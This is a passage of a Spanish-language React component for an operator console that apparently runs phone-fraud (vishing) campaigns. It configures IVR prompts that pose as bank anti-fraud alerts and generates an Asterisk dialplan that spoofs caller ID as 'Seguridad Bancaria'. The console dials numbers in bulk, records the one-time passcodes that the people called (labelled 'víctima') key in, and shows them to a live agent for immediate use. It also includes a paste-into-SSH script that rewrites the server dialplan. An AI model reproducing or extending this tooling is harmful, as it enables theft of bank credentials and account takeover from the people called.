              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                    <span>2. Solicitud de Código OTP (DTMF)</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].promptAudioPath, 'prompt')}
                    disabled={!campaignAudios[selectedService].promptAudioPath}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'prompt' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                        <span className="text-emerald-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-1.5">
                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                  <select
                    value={campaignAudios[selectedService].promptAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                  >
                    <option value="">-- Beep estándar (espera dígitos) --</option>
                    <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos ("Digite su TOKEN de 6 dígitos") [RECOMENDADO]</option>
                    <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos ("Digite su TOKEN de 6 dígitos")</option>
                    <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp</option>
                    <option value={`custom/solicitar_otp_${selectedService}`}>custom/solicitar_otp_{selectedService}</option>
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                  <input
                    type="text"
                    value={campaignAudios[selectedService].promptAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
                    placeholder="ej: custom/solicitar_codigo_otp"
                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
                  />
                  <div className="text-[10px] text-slate-500 font-mono">
                    Ruta física: /var/lib/asterisk/sounds/{campaignAudios[selectedService].promptAudioPath || 'beep'}.wav
                  </div>
                </div>
              </div>

              {/* Slot 3: Transferencia Press-1 (Asesor) */}
              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-sky-400"></span>
                    <span>3. Transferencia Press 1 (A Asesor / Ext 1001)</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].agentAudioPath, 'agent')}
                    disabled={!campaignAudios[selectedService].agentAudioPath}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'agent' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-sky-400 animate-pulse" />
                        <span className="text-sky-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-1.5">
                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                  <select
                    value={campaignAudios[selectedService].agentAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
                  >
                    <option value="">-- Sin audio previo (Directo a X-Lite) --</option>
                    <option value="custom/conectar_asesor">custom/conectar_asesor ("Transfiriendo con un asesor...")</option>
                    <option value={`custom/conectar_asesor_${selectedService}`}>custom/conectar_asesor_{selectedService}</option>
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                  <input
                    type="text"
                    value={campaignAudios[selectedService].agentAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
                    placeholder="ej: custom/conectar_asesor"
                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-sky-500 focus:outline-none"
                  />
                  <div className="text-[10px] text-slate-500 font-mono">
                    Destino: Extensión <strong className="text-emerald-400">{agentExtension}</strong> (PJSIP)
                  </div>
                </div>
              </div>

              {/* Slot 4: Despedida / Éxito OTP */}
              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-purple-400"></span>
                    <span>4. Confirmación / Éxito OTP Final</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].successAudioPath, 'success')}
                    disabled={!campaignAudios[selectedService].successAudioPath}
                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
                    title="Escuchar audio"
                  >
                    {playingAudioKey === 'success' ? (
                      <>
                        <Pause className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
                        <span className="text-purple-400">Pausar</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5 text-slate-300" />
                        <span>Escuchar</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="space-y-1.5">
                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
                  <select
                    value={campaignAudios[selectedService].successAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
                  >
                    <option value="">-- SayDigits (repite dígitos capturados) --</option>
                    <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
                    <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
                    {audios.map((a) => (
                      <option key={a.id} value={a.asteriskPath}>
                        {a.name} ({a.asteriskPath})
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
                  <input
                    type="text"
                    value={campaignAudios[selectedService].successAudioPath}
                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
                    placeholder="ej: custom/operacion_bloqueada_exito"
                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-purple-500 focus:outline-none"
                  />
                  <div className="text-[10px] text-slate-500 font-mono">
                    Ruta física: /var/lib/asterisk/sounds/{campaignAudios[selectedService].successAudioPath || 'SayDigits'}.wav
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Configuración de Extensión de Softphone y Terminal VPS */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Parámetros de Operador */}
            <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
              <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                <Settings2 className="w-4 h-4 text-emerald-400" />
                <span>3. Softphone Receptor</span>
              </h4>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">
                    Extensión Asignada para Press-1
                  </label>
                  <select
                    value={agentExtension}
                    onChange={(e) => setAgentExtension(e.target.value)}
                    className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
                  >
                    <option value="1001">Extensión 1001 (Operador Principal - X-Lite / MicroSIP)</option>
                    <option value="1002">Extensión 1002 (Operador Secundario)</option>
                  </select>
                  <div className="text-[11px] text-slate-400 mt-1">
                    Cuando la víctima pulse 1, Asterisk marcará PJSIP/{agentExtension}.
                  </div>
                </div>

                <div className="p-3 rounded-xl bg-slate-900/80 border border-slate-800 text-xs space-y-1">
                  <div className="text-slate-400 font-mono text-[10px]">Llamada de Prueba Interna</div>
                  <div className="text-slate-200">
                    Marca <code className="text-emerald-400 font-bold">8888</code> en tu softphone (1001) para escuchar y probar el IVR antes de lanzar llamadas a números externos.
                  </div>
                </div>
              </div>
            </div>

            {/* Script Autónomo VPS */}
            <div className="lg:col-span-2 p-6 rounded-2xl bg-slate-950 border border-amber-500/30 space-y-3">
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
                <div className="flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-amber-400 shrink-0" />
                  <div>
                    <h4 className="text-xs font-bold text-amber-300 uppercase tracking-wider">
                      Script Autónomo para Aplicar en Servidor VPS (vmi3461829)
                    </h4>
                    <p className="text-[11px] text-slate-400">
                      Actualiza /etc/asterisk/extensions.conf con este flujo y recarga Asterisk.
                    </p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() => {
                    const fullScript = `cat << 'EOF' > /etc/asterisk/extensions.conf
; ========================================================
; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP
; Auto-generado por Anonymous OTP Asterisk Platform
; ========================================================

[general]
static=yes
writeprotect=no

[globals]
GLOBAL_CARRIER_HOST=162.248.51.10
GLOBAL_DEFAULT_INTRO=${campaignAudios[selectedService]?.introAudioPath || 'custom/alerta_banco_antifraude'}
GLOBAL_DEFAULT_PROMPT=${campaignAudios[selectedService]?.promptAudioPath || 'custom/solicitar_codigo_otp'}
GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion
GLOBAL_DEFAULT_SUCCESS=${campaignAudios[selectedService]?.successAudioPath || 'custom/operacion_bloqueada_exito'}
GLOBAL_DEFAULT_AGENT=${campaignAudios[selectedService]?.agentAudioPath || 'custom/conectar_asesor_banco'}

; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real
[sub-pjsip-headers]
exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)
 same => n,Set(PJSIP_HEADER(add,Privacy)=none)
 same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)
 same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>;party=calling;screen=yes;privacy=off)
 same => n,Return()

[from-internal]
; 1. Llamadas internas entre extensiones (1001-1999)
exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})
 same => n,Dial(PJSIP/\${EXTEN},30,Tt)
 same => n,Hangup()

; 2a. Extension Dedicada de Captura en Vivo de Digitos (Extension 7777)
exten => 7777,1,NoOp(=== TRANSFERENCIA DE CLIENTE A CAPTURA EN VIVO EXT 7777 ===)
 same => n,Answer()
 same => n,Wait(1)
 same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})
 same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:${agentExtension})})
 same => n,Goto(ivr-captura-vivo,s,1)

; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)
exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888 ===)
 same => n,Set(IS_TEST_CALL=1)
 same => n,Set(CALL_DEST=8888)
 same => n,Set(CALLING_AGENT=\${CALLERID(num)})
 same => n,Set(IVR_AGENT_EXTEN=${agentExtension})
 same => n,Goto(ivr-otp,s,1)

; 2b. Acceso a Simulador IVR Local (*8888 o 8880)
exten => *8888,1,Goto(8888,1)
exten => 8880,1,Goto(8888,1)

; 3. Regla Saliente USA / Canada 11 digitos
exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via televox)
 same => n,Set(CALLING_AGENT=\${CALLERID(num)})
 same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
 same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
 same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
 same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
 same => n,Set(CALLERID(pres)=allowed_passed_screen)
 same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
 same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
 same => n,Hangup()

; 4. Regla Saliente 10 digitos (antepone 1)
exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via televox)
 same => n,Dial(PJSIP/1\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
 same => n,Hangup()

; 5. Regla Saliente Generica
exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via televox)
 same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
 same => n,Hangup()

[trunkinbound]
exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})
 same => n,Goto(ivr-otp,s,1)

; ========================================================
; CONTEXTO DEDICADO CAPTURA EN VIVO (EXT 7777)
; ========================================================
[ivr-captura-vivo]
exten => s,1,NoOp(=== [CAPTURA-7777] INICIANDO PARA DESTINO: \${TARGET_DEST} ===)
 same => n,Answer()
 same => n,Wait(1)
 same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:${agentExtension})})
 same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)})
 same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))
 same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))
 same => n,Playback(beep)
 same => n,Read(USER_DIGITS,\${AUDIO_7777},6,,2,15)
 same => n,GotoIf($["\${USER_DIGITS}" != ""]?captura_ok)
 same => n,Playback(beep)
 same => n,Read(USER_DIGITS,beep,6,,2,10)
 same => n,GotoIf($["\${USER_DIGITS}" = ""]?captura_timeout)

 same => n(captura_ok),NoOp(=== [CAPTURA-7777] DIGITOS RECIBIDOS: \${USER_DIGITS} ===)
 same => n,Set(DB(captured_otp/\${TARGET_DEST}/code)=\${USER_DIGITS})
 same => n,Set(DB(captured_otp/\${TARGET_DEST}/status)=captured)
 same => n,Set(DB(captured_otp/\${TARGET_DEST}/timestamp)=\${EPOCH})
 same => n,UserEvent(OtpCaptured,Destination: \${TARGET_DEST},Code: \${USER_DIGITS})
 same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)
 same => n,Playback(beep)
 same => n,Wait(1)
 same => n,NoOp(=== [CAPTURA-7777] RETORNANDO LLAMADA AL ASESOR EN EXTENSION \${FINAL_AGENT} ===)
 same => n,Dial(PJSIP/\${FINAL_AGENT},60)
 same => n,Hangup()

 same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT SIN DIGITOS -> RECONECTANDO ASESOR ===)
 same => n,Playback(beep)
 same => n,Dial(PJSIP/\${FINAL_AGENT},60)
 same => n,Hangup()

; ========================================================
; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS
; ========================================================
[ivr-otp]
exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)
 same => n,Answer()
 same => n,Wait(1)
 same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})
 
 same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})
 same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))
 same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))
 same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/alerta_banco_antifraude))
 
 same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})
 same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))
 same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${GLOBAL_DEFAULT_PROMPT}))
 same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))
 
 same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})
 same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))
 same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))
 
 same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})
 same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${GLOBAL_DEFAULT_SUCCESS}))
 same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))

 same => n,Set(IVR_WAIT=custom/un_momento_validando_informacion)

 ; 1. Reproducir Saludo de Alerta Antifraude
 same => n,Playback(\${IVR_INTRO})
 same => n,Wait(1)

 ; 2. Reproducir Solicitud de Token y esperar digitos (Read)
 same => n,Read(CAPTURED_CODE,\${IVR_PROMPT},6,,3,10)

 ; Si la victima presiono 1 (Modo Asesor Directo)
 same => n,GotoIf($["\${CAPTURED_CODE}" = "1"]?transfer_agent)
 same => n,GotoIf($["\${CAPTURED_CODE}" = ""]?no_digits)

 ; 3. Guardar en AstDB
 same => n,Set(DB(captured_otp/\${TARGET_DEST}/code)=\${CAPTURED_CODE})
 same => n,Set(DB(captured_otp/\${TARGET_DEST}/status)=captured)
 same => n,Set(DB(captured_otp/\${TARGET_DEST}/timestamp)=\${EPOCH})
 same => n,UserEvent(OtpCaptured,Destination: \${TARGET_DEST},Code: \${CAPTURED_CODE})

 ; 4. Reproducir Espera y luego Exito
 same => n,Playback(\${IVR_WAIT})
 same => n,Wait(1)
 same => n,Playback(\${IVR_SUCCESS})
 same => n,Wait(2)
 same => n,Hangup()

 ; Transferencia a Extensión Asesor (Softphone X-Lite ${agentExtension})
 same => n(transfer_agent),Wait(2)
 same => n,Playback(\${IVR_AGENT})
 same => n,Dial(PJSIP/${agentExtension},30,Tt)
 same => n,Hangup()

 ; Sin digitos ingresados
 same => n(no_digits),Playback(custom/por_favor_ingrese_su_clave)
 same => n,Read(CAPTURED_CODE2,beep,6,,2,8)
 same => n,GotoIf($["\${CAPTURED_CODE2}" != ""]?save_retry)
 same => n,Hangup()

 same => n(save_retry),Set(DB(captured_otp/\${TARGET_DEST}/code)=\${CAPTURED_CODE2})
 same => n,Set(DB(captured_otp/\${TARGET_DEST}/status)=captured)
 same => n,Playback(\${IVR_SUCCESS})
 same => n,Hangup()
EOF

asterisk -rx 'dialplan reload'
asterisk -rx 'pjsip reload'
echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
                    navigator.clipboard.writeText(fullScript);
                    setIsCopiedVpsCmd(true);
                    setTimeout(() => setIsCopiedVpsCmd(false), 2500);
                  }}
                  className="px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-xs font-semibold flex items-center gap-1.5 transition-all self-start sm:self-auto shadow-sm"
                >
                  <Copy className="w-3.5 h-3.5" />
                  <span>{isCopiedVpsCmd ? '¡Script Copiado!' : 'Copiar Script SSH'}</span>
                </button>
              </div>

              <p className="text-[11px] text-slate-400 leading-relaxed">
                Haz clic en <strong>"Copiar Script SSH"</strong> y pégalo directamente en la consola SSH de tu servidor Asterisk (<code className="text-amber-300">vmi3461829</code>). Aplicará las rutas de audio de esta campaña y recargará el dialplan al instante.
              </p>
            </div>
          </div>

          {/* Barra de Lanzamiento Inmediato desde la Pestaña del IVR */}
          <div className="p-5 rounded-2xl bg-gradient-to-r from-slate-950 via-slate-900 to-slate-950 border border-emerald-500/30 flex flex-col sm:flex-row items-center justify-between gap-4">
            <div className="flex items-center gap-3">
              <div className="p-2.5 rounded-xl bg-emerald-500/20 text-emerald-400">
                <Rocket className="w-5 h-5" />
              </div>
              <div>
                <div className="text-xs font-bold text-white">¿Listo para lanzar con este flujo de IVR?</div>
                <div className="text-[11px] text-slate-400">
                  Destino actual: <strong className="text-emerald-400 font-mono">{targetNumber || 'Sin número'}</strong> | Modo: <strong className="text-white uppercase">{callFlowMode}</strong>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-2.5 w-full sm:w-auto">
              <button
                type="button"
                onClick={() => setProductionMode('single')}
                className="px-4 py-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-700 text-xs font-bold transition-all w-full sm:w-auto text-center"
              >
                Ajustar Número / CallerID
              </button>

              <button
                type="button"
                onClick={handleLaunchProductionCall}
                disabled={isLaunching || !targetNumber.trim()}
                className="px-6 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 text-slate-950 font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/20 transition-all w-full sm:w-auto"
              >
                <PhoneCall className={`w-4 h-4 ${isLaunching ? 'animate-bounce' : ''}`} />
                <span>{isLaunching ? 'Lanzando Llamada...' : 'Lanzar Llamada Ahora'}</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* BULK DIALER PANEL */}
      {productionMode === 'bulk' && (
        <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="text-base font-bold text-white flex items-center gap-2">
              <Flame className="w-5 h-5 text-emerald-400" />
              <span>Marcador Masivo por Lotes (Bulk Campaign)</span>
            </h3>
            <span className="text-xs text-slate-400">Pega tu lista de números telefónicos</span>
          </div>

          <textarea
            id="textarea-bulk-numbers"
            rows={6}
            value={bulkNumbersText}
            onChange={(e) => setBulkNumbersText(e.target.value)}
            placeholder="16104803845&#10;14155552671&#10;12125559823"
            className="w-full p-4 bg-slate-900 border border-slate-700 rounded-xl text-white font-mono text-sm focus:border-emerald-500 focus:outline-none"
          />

          <div className="flex items-center justify-between pt-2">
            <div className="text-xs text-slate-400">
              Total de números detectados:{' '}
              <strong className="text-emerald-400 font-mono">
                {bulkNumbersText.split('\n').filter((n) => n.trim().length >= 8).length}
              </strong>
            </div>

            <button
              id="btn-launch-bulk"
              onClick={() => {
                const nums = bulkNumbersText.split('\n').filter((n) => n.trim().length >= 8);
                if (nums.length > 0) {
                  setTargetNumber(nums[0].trim());
                  setProductionMode('single');
                  alert(`Cargado primer número de la lista: ${nums[0].trim()}`);
                }
              }}
              className="px-5 py-2.5 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
            >
              Cargar al Disparador de Producción
            </button>
          </div>
        </div>
      )}

      {/* LIVE CAPTURED OTP MONITOR FOR AGENT (Prominent HUD) */}
      {otpRecords.length > 0 && showLiveMonitor && (
        <div className="p-6 rounded-2xl bg-gradient-to-br from-slate-900 via-slate-950 to-slate-900 border-2 border-emerald-500/50 shadow-2xl shadow-emerald-500/10 space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div className="flex items-center gap-2.5">
              <span className="relative flex h-3 w-3">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
              </span>
              <h3 className="text-sm font-extrabold text-white tracking-wide flex items-center gap-2">
                <KeyRound className="w-4 h-4 text-emerald-400" />
                <span>MONITOR EN VIVO DEL AGENTE: ÚLTIMO TOKEN CAPTURADO DEL CLIENTE</span>
              </h3>
            </div>
            <div className="flex items-center gap-3">
              <div className="text-xs font-mono text-slate-400">
                Objetivo: <strong className="text-sky-400 font-bold">{otpRecords[0].number}</strong> ({otpRecords[0].service || 'Banco / Antifraude'}) • <span className="text-slate-400">{otpRecords[0].timestamp}</span>
              </div>
              <button
                type="button"
                onClick={() => setShowLiveMonitor(false)}
                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-all cursor-pointer text-xs flex items-center gap-1"
                title="Ocultar monitor de dígitos"
              >
                <X className="w-4 h-4" />
                <span className="hidden sm:inline text-[11px]">Ocultar</span>
              </button>
            </div>
          </div>

          <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6 py-2">
            {/* Visualización de los dígitos marcados en el teclado */}
            <div className="space-y-1.5 text-center lg:text-left">
              <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">
                Dígitos digitados por el cliente en su teléfono:
              </div>
              <div className="flex items-center justify-center lg:justify-start gap-2">
                {otpRecords[0].otp.split('').map((digit, idx) => (
                  <span
                    key={idx}
                    className="w-12 h-14 sm:w-14 sm:h-16 flex items-center justify-center text-2xl sm:text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/80 shadow-lg shadow-emerald-500/20"
                  >
                    {digit}
                  </span>
                ))}
              </div>
            </div>

            {/* Botones de Decisión del Agente (VÁLIDO / INVÁLIDO) */}
            <div className="flex flex-wrap items-center justify-center lg:justify-end gap-3">
              <button
                type="button"
                id="btn-live-agent-approve-otp"
                onClick={() => handleVerifyOtp('valid', otpRecords[0].otp, otpRecords[0].number, otpRecords[0].id)}
                className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-xs sm:text-sm shadow-xl transition-all ${
                  otpRecords[0].status === 'valid'
                    ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
                    : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
                }`}
              >
                <CheckCircle className="w-5 h-5" />
                <span>CÓDIGO VÁLIDO</span>
              </button>

              <button
                type="button"
                id="btn-live-agent-reject-otp"
                onClick={() => handleVerifyOtp('invalid', otpRecords[0].otp, otpRecords[0].number, otpRecords[0].id)}
                title="Marca como inválido y el IVR le pide un nuevo token de 6 dígitos automáticamente al cliente"
                className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-xs sm:text-sm shadow-xl transition-all ${
                  otpRecords[0].status === 'invalid'
                    ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
                    : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
                }`}
              >
                <XCircle className="w-5 h-5" />
                <span>CÓDIGO INVÁLIDO</span>
              </button>

              <button
                type="button"
                id="btn-live-agent-copy-otp"
                onClick={() => handleCopyOtp(otpRecords[0].otp, 'monitor-top')}
                className="inline-flex items-center gap-1.5 px-4 py-3.5 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
              >
                {copiedId === 'monitor-top' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                <span>{copiedId === 'monitor-top' ? '¡Copiado!' : 'Copiar'}</span>
              </button>
            </div>
          </div>

          <div className="flex flex-wrap items-center justify-between gap-2 text-xs pt-2 border-t border-slate-800/80">
            <span className="text-slate-400">
              Estado actual del código:{' '}
              {otpRecords[0].status === 'valid' ? (
                <strong className="text-emerald-400 font-bold">✓ VÁLIDO (Aprobado por el asesor)</strong>
              ) : otpRecords[0].status === 'invalid' ? (
                <strong className="text-rose-400 font-bold">✗ INVÁLIDO (Rechazado por el asesor)</strong>
              ) : (
                <strong className="text-amber-400 font-bold">⏳ Pendiente de decisión del asesor</strong>
              )}
            </span>
            <div className="flex items-center gap-3">
              <span className="text-[11px] text-slate-500 font-mono hidden md:inline">
                Audio configurado en IVR: <span className="text-emerald-400">"Por favor digite su TOKEN de 6 dígitos"</span>
              </span>
              <button
                type="button"
                onClick={handleClearHistory}
                className="text-xs text-rose-400 hover:text-rose-300 underline font-medium cursor-pointer"
                title="Borrar códigos de pruebas anteriores"
              >
                Limpiar datos de prueba
              </button>
            </div>
          </div>
        </div>
      )}

      {/* HISTORICAL TABLE OF CAPTURED OTPS */}
      <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h3 className="text-base font-bold text-white flex items-center gap-2">
